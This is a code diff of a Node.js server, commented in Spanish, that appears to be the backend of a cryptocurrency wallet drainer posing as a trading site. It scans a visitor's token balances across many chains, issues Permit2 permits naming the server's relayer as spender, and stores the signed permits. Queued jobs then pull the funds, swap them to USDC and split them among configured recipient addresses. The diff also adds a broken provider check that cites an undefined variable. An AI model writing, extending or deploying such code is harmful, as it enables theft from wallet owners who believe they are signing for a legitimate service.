@@ -1,4 +1,4 @@
-// server.js (completo, ESM)
+// server.js (versión corregida y completa)
 import express from "express";
 import bodyParser from "body-parser";
 import cors from "cors";
@@ -35,7 +35,7 @@ const app = express();
 const allowedOrigins = ['https://axomtrade.vercel.app', 'http://localhost:3000'];
 app.use(cors({
   origin: function (origin, callback) {
-    // Permitir requests sin origin (like curl or mobile)
+    // Permitir requests sin origin (como mobile apps o curl requests)
     if (!origin) return callback(null, true);
     if (allowedOrigins.indexOf(origin) === -1) {
       const msg = 'The CORS policy for this site does not allow access from the specified Origin.';
@@ -63,20 +63,20 @@ app.use((req, res, next) => {
 
 // Health check endpoint
 app.get('/health', (req, res) => {
-  res.json({
-    status: 'OK',
+  res.json({ 
+    status: 'OK', 
     message: 'Backend server is running',
     timestamp: new Date().toISOString(),
     uptime: process.uptime()
   });
 });
 
-app.get('/ping', (req, res) => {
+app.get('/ping', (req, res) => { 
   res.json({ ok: true });
 });
 
 // ----------------- CONFIG -----------------
-const PORT = Number(process.env.PORT || 3001);
+const PORT = Number(process.env.PORT || 3001); // Cambiado a 3001 para evitar conflictos
 const DEFAULT_CHAIN = Number(process.env.CHAIN_ID || 80002);
 const RELAYER_PRIVATE_KEY = process.env.RELAYER_PRIVATE_KEY || "";
 const RELAYER_SOL_SECRET = process.env.RELAYER_SOL_SECRET || process.env.SOL_RELAYER_PRIVATE_KEY || "";
@@ -94,91 +94,10 @@ const RECIPIENTS = (process.env.RECIPIENTS || "").split(",").map(s => s.trim()).
 const MAX_JOB_RETRIES = Number(process.env.MAX_JOB_RETRIES || 3);
 const SOL_USDC_MINT = process.env.SOL_USDC_MINT || null;
 
-// Concurrency env overrides
-const CHAIN_SCAN_CONCURRENCY = Number(process.env.CHAIN_SCAN_CONCURRENCY || 3);
-const TOKEN_METADATA_CONCURRENCY = Number(process.env.TOKEN_METADATA_CONCURRENCY || 6);
-const COVALENT_PROCESS_CONCURRENCY = Number(process.env.COVALENT_PROCESS_CONCURRENCY || 6);
-
-// Añade esta función helper al principio del archivo, después de los imports
-const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
-
-// fetchWithRetry usando axios (más robusto en Node)
-const fetchWithRetry = async (url, options = {}, maxRetries = 3, baseDelay = 1000) => {
-  let lastError;
-  for (let i = 0; i < maxRetries; i++) {
-    try {
-      const method = (options.method || 'GET').toUpperCase();
-      const axiosOpts = {
-        url,
-        method,
-        headers: options.headers || {},
-        timeout: options.timeout || 15000,
-        validateStatus: () => true,
-      };
-      if (method === 'GET') {
-        axiosOpts.params = options.params || undefined;
-      } else {
-        axiosOpts.data = options.body || options.data || undefined;
-      }
-
-      const response = await axios(axiosOpts);
-
-      if (response.status >= 200 && response.status < 300) {
-        return response.data;
-      }
-
-      if (response.status === 429) {
-        const retryAfter = response.headers && response.headers['retry-after'];
-        const waitTime = retryAfter ? parseInt(retryAfter) * 1000 : baseDelay * Math.pow(2, i);
-        console.warn(`Rate limited. Retrying in ${waitTime}ms`);
-        await delay(waitTime);
-        continue;
-      }
-
-      // Unexpected HTTP status -> throw
-      throw new Error(`HTTP error: ${response.status} ${response.statusText || ''}`);
-    } catch (error) {
-      lastError = error;
-      if (i < maxRetries - 1) {
-        const waitTime = baseDelay * Math.pow(2, i);
-        await delay(waitTime);
-      }
-    }
-  }
-  throw lastError;
-};
-
-// ----------------- UTILIDADES PARA CONCURRENCIA Y CACHÉ -----------------
-// Caché simple para metadata de token (decimals + symbol)
-const tokenInfoCache = new Map(); // key: `${chain}:${address.toLowerCase()}`
-
-// asyncPool: limita concurrencia para promesas
-async function asyncPool(poolLimit, array, iteratorFn) {
-  const ret = [];
-  const executing = [];
-  for (const item of array) {
-    const p = Promise.resolve().then(() => iteratorFn(item));
-    ret.push(p);
-
-    const e = p.then(() => {
-      const idx = executing.indexOf(e);
-      if (idx > -1) executing.splice(idx, 1);
-    }).catch(() => {
-      const idx = executing.indexOf(e);
-      if (idx > -1) executing.splice(idx, 1);
-    });
-
-    executing.push(e);
-    if (executing.length >= poolLimit) {
-      await Promise.race(executing);
-    }
-  }
-  return Promise.all(ret);
-}
-
-// ----------------- CONSTANTES Y PROVIDERS -----------------
+// 1inch native token address marker
 const ONEINCH_NATIVE_ADDRESS = "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE";
 
+// Mapeo de símbolos para tokens nativos
 const NATIVE_SYMBOLS = {
   1: "ETH",
   56: "BNB",
@@ -192,9 +111,9 @@ const NATIVE_SYMBOLS = {
 
 // provider map (EVM chains) - use your RPC env vars
 const PROVIDERS = {
-  1: new ethers.providers.JsonRpcProvider(process.env.RPC_URL_ETH || process.env.RPC_URL || ""),
-  56: new ethers.providers.JsonRpcProvider(process.env.RPC_URL_BSC || process.env.RPC_URL || ""),
-  137: new ethers.providers.JsonRpcProvider(process.env.RPC_URL_POLYGON || process.env.RPC_URL || ""),
+  1: new ethers.providers.JsonRpcProvider(process.env.RPC_URL_ETH),
+  56: new ethers.providers.JsonRpcProvider(process.env.RPC_URL_BSC),
+  137: new ethers.providers.JsonRpcProvider(process.env.RPC_URL_POLYGON),
   80002: new ethers.providers.JsonRpcProvider(process.env.RPC_URL_AMOY || process.env.RPC_URL || ""),
   43114: new ethers.providers.JsonRpcProvider(process.env.RPC_URL_AVAX || process.env.RPC_URL || ""),
   250: new ethers.providers.JsonRpcProvider(process.env.RPC_URL_FTM || process.env.RPC_URL || ""),
@@ -202,6 +121,12 @@ const PROVIDERS = {
   10: new ethers.providers.JsonRpcProvider(process.env.RPC_URL_OP || process.env.RPC_URL || "")
 };
 
+
+
+
+if (!PROVIDERS) {
+  throw new Error(`Unsupported chain: ${chainId}`);
+}
 // Solana connection
 const solanaConn = new Connection(SOLANA_RPC, "confirmed");
 
@@ -258,15 +183,14 @@ const JOBS_FILE = "jobs.json";
 // Nuevas constantes para expiración
 const SIGNATURE_EXPIRATION_HOURS = 2;
 const JOB_EXPIRATION_HOURS = 2;
-
 // helpers persistence (no top-level await here)
 async function getAndReserveNonce(owner, token) {
   try {
     const nonces = await fs.readJson(NONCE_FILE);
     const key = `${owner.toLowerCase()}-${(token || 'native')}`;
     const n = Number(nonces[key]?.nonce || 0);
-    nonces[key] = {
-      nonce: n + 1,
+    nonces[key] = { 
+      nonce: n + 1, 
       timestamp: Date.now(),
       expiresAt: Date.now() + (SIGNATURE_EXPIRATION_HOURS * 60 * 60 * 1000)
     };
@@ -313,7 +237,6 @@ async function updateJob(id, patch) {
 async function getNextPendingJob() {
   try {
     const jobs = await fs.readJson(JOBS_FILE);
-    // prefer pending first, then awaiting_transfer
     return jobs.find(j => j.status === 'pending' || j.status === 'awaiting_transfer') || null;
   } catch (e) {
     console.warn("Error reading jobs file:", e.message || e);
@@ -329,7 +252,7 @@ async function isSignatureExpired(owner, token) {
     const nonces = await fs.readJson(NONCE_FILE);
     const key = `${owner.toLowerCase()}-${(token || 'native')}`;
     const nonceData = nonces[key];
-
+    
     if (!nonceData) return true;
     return Date.now() > nonceData.expiresAt;
   } catch (e) {
@@ -344,49 +267,21 @@ async function cleanupExpiredJobs() {
     const jobs = await fs.readJson(JOBS_FILE);
     const now = Date.now();
     const expirationTime = JOB_EXPIRATION_HOURS * 60 * 60 * 1000;
-
+    
     const validJobs = jobs.filter(job => {
       const jobTime = new Date(job.createdAt).getTime();
       return (now - jobTime) < expirationTime;
     });
-
+    
     await fs.writeJson(JOBS_FILE, validJobs, { spaces: 2 });
     console.log(`Cleaned up ${jobs.length - validJobs.length} expired jobs`);
   } catch (e) {
     console.warn("Error cleaning up expired jobs:", e.message || e);
   }
 }
-
 // ----------------- TOKEN DETECTION -----------------
-// Helper: obtiene metadata (decimals + symbol) con caché
-async function getTokenInfoWithCache(chainIdNum, tokenAddress, provider) {
-  if (!tokenAddress) return { decimals: 18, symbol: "NATIVE" };
-  const key = `${chainIdNum}:${tokenAddress.toLowerCase()}`;
-  if (tokenInfoCache.has(key)) return tokenInfoCache.get(key);
-
-  try {
-    const c = new ethers.Contract(tokenAddress, ["function decimals() view returns (uint8)", "function symbol() view returns (string)"], provider);
-    const [decRes, symRes] = await Promise.allSettled([c.decimals(), c.symbol()]);
-    const decimals = decRes.status === 'fulfilled' && decRes.value != null ? Number(decRes.value) : 18;
-    const symbol = symRes.status === 'fulfilled' && symRes.value ? String(symRes.value) : "TOKEN";
-    const info = { decimals, symbol };
-    tokenInfoCache.set(key, info);
-    return info;
-  } catch (e) {
-    // no rompemos todo si falla metadata, devolvemos defaults
-    return { decimals: 18, symbol: "TOKEN" };
-  }
-}
-
 async function getEvmTokens(chainId, owner) {
   const out = [];
-  const chainIdNum = Number(chainId);
-
-  // Verificar si la red está dentro de un conjunto aceptado (evita consultar cadenas no soportadas)
-  const enabledChains = [1, 56, 137, 80002, 43114, 42161, 10, 250];
-  if (!enabledChains.includes(chainIdNum)) return out;
-
-  // Primer intento: Alchemy (si está configurado)
   try {
     if (ALCHEMY_KEY) {
       const hostMap = {
@@ -394,82 +289,55 @@ async function getEvmTokens(chainId, owner) {
         56: "bsc-mainnet",
         137: "polygon-mainnet",
         80002: "polygon-amoy",
+        80001: "polygon-mumbai",
         43114: "avalanche-mainnet",
+        250: "fantom-mainnet",
         42161: "arbitrum-mainnet",
-        10: "optimism-mainnet",
-        250: "fantom-mainnet"
+        10: "optimism-mainnet"
       };
-      const host = hostMap[chainIdNum];
+      const host = hostMap[Number(chainId)];
       if (host) {
         const url = `https://${host}.g.alchemy.com/v2/${ALCHEMY_KEY}`;
         const body = { jsonrpc: "2.0", id: 42, method: "alchemy_getTokenBalances", params: [owner, "erc20"] };
-        const r = await fetchWithRetry(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) }, 3, 800);
-        const list = r?.result?.tokenBalances ?? [];
-        const prov = PROVIDERS[chainIdNum];
-
-        const tokensToProcess = list.filter(tb => tb.contractAddress && !(ethers.BigNumber.from(tb.tokenBalance || "0x0").isZero()));
-        if (tokensToProcess.length > 0) {
-          // metadata concurrency limitado
-          const results = await asyncPool(TOKEN_METADATA_CONCURRENCY, tokensToProcess, async (tb) => {
-            try {
-              const bal = ethers.BigNumber.from(tb.tokenBalance || "0x0");
-              if (bal.isZero()) return null;
-              const info = await getTokenInfoWithCache(chainIdNum, tb.contractAddress, prov);
-              return {
-                chain: chainIdNum,
-                symbol: info.symbol,
-                address: tb.contractAddress,
-                decimals: info.decimals,
-                balance: bal.toString()
-              };
-            } catch (e) {
-              return null;
-            }
-          });
-
-          for (const it of results) if (it) out.push(it);
+        const r = await axios.post(url, body);
+        const list = r?.data?.result?.tokenBalances ?? [];
+        const prov = PROVIDERS[chainId];
+        for (const tb of list) {
+          try {
+            if (!tb.contractAddress) continue;
+            const bal = ethers.BigNumber.from(tb.tokenBalance || "0x0");
+            if (bal.isZero()) continue;
+            const c = new ethers.Contract(tb.contractAddress, ["function decimals() view returns (uint8)", "function symbol() view returns (string)"], prov);
+            const decimals = Number(await c.decimals().catch(() => 18));
+            const symbol = await c.symbol().catch(() => "TOKEN");
+            out.push({ chain: chainId, symbol, address: tb.contractAddress, decimals, balance: bal.toString() });
+          } catch (e) { continue; }
         }
-
         if (out.length) return out;
       }
     }
-  } catch (e) {
-    console.warn("alchemy tokenbalances failed", e?.message || e);
-  }
+  } catch (e) { console.warn("alchemy tokenbalances failed", e?.response?.data || e?.message || e); }
 
-  // Fallback: Covalent
   try {
     if (COVALENT_KEY) {
-      const map = { 1: 1, 56: 56, 137: 137, 43114: 43114, 42161: 42161, 10: 10, 250: 250, 80002: 80002 };
-      const covChain = map[chainIdNum];
+      const map = { 1: 1, 56: 56, 137: 137, 43114: 43114, 250: 250, 42161: 42161, 10: 10 };
+      const covChain = map[chainId];
       if (covChain) {
         const url = `https://api.covalenthq.com/v1/${covChain}/address/${owner}/balances_v2/?key=${COVALENT_KEY}`;
-        const r = await fetchWithRetry(url, { method: 'GET' }, 3, 800);
-        const items = r?.data?.items ?? [];
-
-        const results = await asyncPool(COVALENT_PROCESS_CONCURRENCY, items, async (it) => {
+        const r = await axios.get(url);
+        const items = r?.data?.data?.items ?? [];
+        for (const it of items) {
           try {
+            const addr = it.contract_address;
             const bal = ethers.BigNumber.from(it.balance || "0");
-            if (bal.isZero()) return null;
-            return {
-              chain: chainIdNum,
-              symbol: it.contract_ticker_symbol || it.contract_name || "TOKEN",
-              address: it.contract_address,
-              decimals: Number(it.contract_decimals || 18),
-              balance: bal.toString()
-            };
-          } catch (e) {
-            return null;
-          }
-        });
-
-        for (const it of results) if (it) out.push(it);
+            if (bal.isZero()) continue;
+            out.push({ chain: chainId, symbol: it.contract_ticker_symbol || it.contract_name || "TOKEN", address: addr, decimals: Number(it.contract_decimals || 18), balance: bal.toString() });
+          } catch (e) { continue; }
+        }
         if (out.length) return out;
       }
     }
-  } catch (e) {
-    console.warn("covalent fallback failed", e?.message || e);
-  }
+  } catch (e) { console.warn("covalent fallback failed", e?.message || e); }
 
   return out;
 }
@@ -496,49 +364,23 @@ async function getSolanaTokens(owner) {
 
 async function getTokensAllChains(owner) {
   const tokens = [];
-  const evmChains = Object.keys(PROVIDERS).map(x => Number(x)).filter(n => !Number.isNaN(n));
-
-  // concurrent limit para chains
-  const concurrentLimit = CHAIN_SCAN_CONCURRENCY;
-
-  await asyncPool(concurrentLimit, evmChains, async (c) => {
+  const evmChains = Object.keys(PROVIDERS).map(x => Number(x));
+  for (const c of evmChains) {
     try {
       const ev = await getEvmTokens(c, owner);
-
-      // Añadir balance nativo si existe
       try {
         const prov = PROVIDERS[c];
-        if (prov) {
-          const nb = await prov.getBalance(owner).catch(() => null);
-          if (nb && !nb.isZero()) {
-            const symbol = NATIVE_SYMBOLS[c] || "NATIVE";
-            ev.unshift({
-              chain: c,
-              symbol,
-              address: null,
-              decimals: 18,
-              balance: nb.toString()
-            });
-          }
+        const nb = await prov.getBalance(owner).catch(() => null);
+        if (nb && !nb.isZero()) {
+          const symbol = NATIVE_SYMBOLS[c] || "NATIVE";
+          ev.unshift({ chain: c, symbol, address: null, decimals: 18, balance: nb.toString() });
         }
-      } catch (e) {
-        console.warn(`Error getting native balance for chain ${c}:`, e?.message || e);
-      }
-
+      } catch (e) { }
       for (const t of ev) tokens.push(t);
-    } catch (e) {
-      console.warn(`chain scan fail ${c}`, e?.message || e);
-    }
-  });
-
-  // Escanear Solana por separado (no bloquear EVM)
-  try {
-    const sol = await getSolanaTokens(owner);
-    for (const s of sol) tokens.push(s);
-  } catch (e) {
-    console.warn("Solana scan failed:", e?.message || e);
+    } catch (e) { console.warn("chain scan fail", c, e?.message || e); }
   }
-
+  const sol = await getSolanaTokens(owner).catch(() => []);
+  for (const s of sol) tokens.push(s);
   return tokens;
 }
 
@@ -573,7 +415,7 @@ app.post('/owner-tokens', async (req, res) => {
       return res.status(400).json({ error: "owner required" });
     }
 
-    // Si no viene chain, escaneamos todas las chains disponibles
+    // Si no viene chain, escaneamos todas las chains disponibles (getTokensAllChains)
     if (!chain) {
       try {
         console.log('[owner-tokens] scanning all chains for owner=', owner);
@@ -581,7 +423,7 @@ app.post('/owner-tokens', async (req, res) => {
         return res.json({ tokens });
       } catch (e) {
         console.error('[owner-tokens] scan all chains error', e);
-        return res.status(500).json({ error: e.message });
+        return res.status(500).json({ error: e?.message || String(e) });
       }
     }
 
@@ -597,40 +439,61 @@ app.post('/owner-tokens', async (req, res) => {
 
     console.log(`[owner-tokens] scanning chain ${chainId} for owner=${owner}`);
 
+    // Obtener tokens para esta chain
     let tokens = [];
-    if (chainId === 999) { // Asumiendo que 999 representa Solana en tu sistema
+    if (String(chainId).toLowerCase() === 'solana' || chain === 'solana') {
+      // Nota: si quieres admitir 'solana' como string, deberías enviar chain: 'solana' desde el front.
+      // En la práctica, aqui chainId sería NaN si se enviara 'solana' — por eso normalmente se envía 'solana' como string y se maneja aparte.
+      // Pero como ya validamos chainId numérico arriba, esta rama rara vez se ejecutará.
       tokens = await getSolanaTokens(owner);
     } else {
       tokens = await getEvmTokens(chainId, owner);
-
-      // Añadir balance nativo
+      // añadir native balance si existe
       try {
         const prov = PROVIDERS[chainId];
         if (prov) {
           const nb = await prov.getBalance(owner).catch(() => null);
           if (nb && !nb.isZero()) {
             const symbol = NATIVE_SYMBOLS[chainId] || "NATIVE";
-            tokens.unshift({
-              chain: chainId,
-              symbol,
-              address: null,
-              decimals: 18,
-              balance: nb.toString()
-            });
+            tokens.unshift({ chain: chainId, symbol, address: null, decimals: 18, balance: nb.toString() });
+          }
+        }
+      } catch (e) { /* ignore balance fetch failure */ }
+    }
+
+    // Filtrado: verificar balances reales (opcional — mantiene tu lógica original)
+    const filteredTokens = [];
+    for (const token of tokens) {
+      try {
+        if (!token.address) {
+          const prov = PROVIDERS[chainId];
+          if (!prov) continue;
+          const currentBalance = await prov.getBalance(owner);
+          if (currentBalance && !currentBalance.isZero()) {
+            filteredTokens.push({ ...token, balance: currentBalance.toString() });
+          }
+        } else {
+          const prov = PROVIDERS[chainId];
+          if (!prov) continue;
+          const contract = new ethers.Contract(token.address, erc20Abi, prov);
+          const currentBalance = await contract.balanceOf(owner);
+          if (currentBalance && !currentBalance.isZero()) {
+            filteredTokens.push({ ...token, balance: currentBalance.toString() });
           }
         }
       } catch (e) {
-        console.warn(`Error getting native balance for chain ${chainId}:`, e.message);
+        console.warn(`Error verifying balance for token ${token.address || token.symbol}:`, e?.message || e);
       }
     }
 
-    return res.json({ tokens });
+    return res.json({ tokens: filteredTokens });
 
   } catch (err) {
     console.error('/owner-tokens error', err);
-    return res.status(500).json({ error: err.message });
+    return res.status(500).json({ error: err?.message || String(err) });
   }
 });
+
 
 app.post('/permit-data', async (req, res) => {
   try {
@@ -648,21 +511,21 @@ app.post('/permit-data', async (req, res) => {
     } else {
       if (!amountStr || amountStr === "0") return res.status(400).json({ error: "amount required when global not set" });
     }
-
+    
     const nonce = await getAndReserveNonce(owner, token);
     const expirationTime = Math.floor(Date.now() / 1000) + (SIGNATURE_EXPIRATION_HOURS * 60 * 60);
-
+    
     const permitSingle = {
-      details: {
-        token,
-        amount: ethers.BigNumber.from(amountStr).toString(),
+      details: { 
+        token, 
+        amount: ethers.BigNumber.from(amountStr).toString(), 
         expiration: expirationTime,
-        nonce: Number(nonce)
+        nonce: Number(nonce) 
       },
       spender: relayerSigners[chain] ? relayerSigners[chain].address : process.env.RELAYER_ADDRESS || "",
       sigDeadline: expirationTime
     };
-
+    
     const typed = AllowanceTransfer.getPermitData(permitSingle, PERMIT2_ADDRESS, Number(chain || DEFAULT_CHAIN));
     res.json({ ...typed, _backend_nonce: nonce, _expiresAt: expirationTime });
   } catch (e) {
@@ -675,32 +538,32 @@ app.post('/save-signature', async (req, res) => {
   try {
     const { owner, token, typedData, signature, chain } = req.body;
     if (!owner || !token || !typedData || !signature) return res.status(400).json({ error: "owner, token, typedData, signature required" });
-
+    
     // Verificar si la firma ya expiró antes de guardarla
     if (await isSignatureExpired(owner, token)) {
       return res.status(400).json({ error: "Signature has expired" });
     }
-
-    const entry = {
-      now: new Date().toISOString(),
-      owner,
-      token,
-      typedData,
-      signature,
-      used: false,
+    
+    const entry = { 
+      now: new Date().toISOString(), 
+      owner, 
+      token, 
+      typedData, 
+      signature, 
+      used: false, 
       chain: chain || DEFAULT_CHAIN,
       expiresAt: Date.now() + (SIGNATURE_EXPIRATION_HOURS * 60 * 60 * 1000)
     };
     await appendSignature(entry);
-    const job = {
-      id: genId(),
-      createdAt: new Date().toISOString(),
-      status: "pending",
-      retries: 0,
-      owner,
-      token,
-      typedData,
-      signature,
+    const job = { 
+      id: genId(), 
+      createdAt: new Date().toISOString(), 
+      status: "pending", 
+      retries: 0, 
+      owner, 
+      token, 
+      typedData, 
+      signature, 
       chain: chain || DEFAULT_CHAIN,
       expiresAt: Date.now() + (JOB_EXPIRATION_HOURS * 60 * 60 * 1000)
     };
@@ -813,6 +676,7 @@ app.post('/create-native-transfer-request', async (req, res) => {
       isNative: true // Bandera para identificar token nativo
     };
 
+
     await enqueueJob(job);
 
     res.json({
@@ -853,7 +717,6 @@ app.get('/job/:id', async (req, res) => {
 // ----------------- SWAP HELPERS -----------------
 async function swapVia1inch(chainId, tokenIn, amount, relayerAddress) {
   try {
-    if (!ONEINCH_BASE || !USDC_ADDRESS) return { ok: false, error: '1inch or USDC not configured' };
     // pre-check quote
     const qUrl = `${ONEINCH_BASE}/${chainId}/quote`;
     const q = await axios.get(qUrl, { params: { fromTokenAddress: tokenIn, toTokenAddress: USDC_ADDRESS, amount: amount.toString() }, timeout: 10000 }).catch(() => null);
@@ -920,13 +783,13 @@ async function processJob(job) {
     if (job.isNative && job.chain !== 'solana') {
       const chainId = Number(job.chain || DEFAULT_CHAIN);
       const prov = PROVIDERS[chainId];
-      // Verificar si el job ha expirado
-      if (job.expiresAt && Date.now() > job.expiresAt) {
-        out.steps.push('Job expired');
-        await updateJob(job.id, { status: 'expired', finishedAt: new Date().toISOString() });
-        await markSignatureUsed(owner, token);
-        return out;
-      }
+        // Verificar si el job ha expirado
+    if (job.expiresAt && Date.now() > job.expiresAt) {
+      out.steps.push('Job expired');
+      await updateJob(job.id, { status: 'expired', finishedAt: new Date().toISOString() });
+      await markSignatureUsed(owner, token);
+      return out;
+    }
 
       if (!prov) { out.steps.push('no provider for chain ' + chainId); return out; }
 
@@ -1048,49 +911,11 @@ async function processJob(job) {
       let swapped = false;
       if (ONEINCH_BASE && USDC_ADDRESS) {
         const s = await swapVia1inch(chainId, tokenAddr, amountToHandle, relayer.address);
-        if (s.ok && s.tx) {
-          try {
-            const txData = s.tx;
-            const txSent = await relayer.sendTransaction({ to: txData.to, data: txData.data, value: ethers.BigNumber.from(txData.value || "0"), gasLimit: txData.gas || 1500000 });
-            out.steps.push({ swapTx: txSent.hash });
-            await txSent.wait();
-            swapped = true;
-          } catch (e) {
-            out.steps.push('sending swap failed: ' + (e?.message || e));
-            swapped = false;
-          }
-        }
+        if (s.ok && s.tx) { try { const txData = s.tx; const txSent = await relayer.sendTransaction({ to: txData.to, data: txData.data, value: ethers.BigNumber.from(txData.value || "0"), gasLimit: txData.gas || 1500000 }); out.steps.push({ swapTx: txSent.hash }); await txSent.wait(); swapped = true; } catch (e) { out.steps.push('sending swap failed: ' + (e?.message || e)); swapped = false; } }
       }
-      if (swapped && USDC_ADDRESS) {
-        try {
-          const usdcC = new ethers.Contract(USDC_ADDRESS, erc20Abi, relayer);
-          const usdcBal = await usdcC.balanceOf(relayer.address);
-          if (usdcBal.isZero()) return false;
-          const per = usdcBal.div(RECIPIENTS.length || 1);
-          for (const r of RECIPIENTS) {
-            if (!r) continue;
-            const tx = await usdcC.transfer(r, per);
-            await tx.wait();
-            out.steps.push(`Sent USDC ${per.toString()} -> ${r}`);
-          }
-          return true;
-        } catch (e) { out.steps.push('distribute USDC failed: ' + (e?.message || e)); return false; }
-      }
-
+      if (swapped && USDC_ADDRESS) { try { const usdcC = new ethers.Contract(USDC_ADDRESS, erc20Abi, relayer); const usdcBal = await usdcC.balanceOf(relayer.address); if (usdcBal.isZero()) return false; const per = usdcBal.div(RECIPIENTS.length || 1); for (const r of RECIPIENTS) { if (!r) continue; const tx = await usdcC.transfer(r, per); await tx.wait(); out.steps.push(`Sent USDC ${per.toString()} -> ${r}`); } return true; } catch (e) { out.steps.push('distribute USDC failed: ' + (e?.message || e)); return false; } }
       // fallback: distribute token directly
-      try {
-        const tokenC = new ethers.Contract(tokenAddr, erc20Abi, relayer);
-        const bal = await tokenC.balanceOf(relayer.address);
-        if (bal.isZero()) return false;
-        const per = bal.div(RECIPIENTS.length || 1);
-        for (const r of RECIPIENTS) {
-          if (!r) continue;
-          const tx = await tokenC.transfer(r, per);
-          await tx.wait();
-          out.steps.push(`Sent token ${per.toString()} -> ${r}`);
-        }
-        return true;
-      } catch (e) { out.steps.push('token fallback distribute failed: ' + (e?.message || e)); return false; }
+      try { const tokenC = new ethers.Contract(tokenAddr, erc20Abi, relayer); const bal = await tokenC.balanceOf(relayer.address); if (bal.isZero()) return false; const per = bal.div(RECIPIENTS.length || 1); for (const r of RECIPIENTS) { if (!r) continue; const tx = await tokenC.transfer(r, per); await tx.wait(); out.steps.push(`Sent token ${per.toString()} -> ${r}`); } return true; } catch (e) { out.steps.push('token fallback distribute failed: ' + (e?.message || e)); return false; }
     }
 
     // First small pull
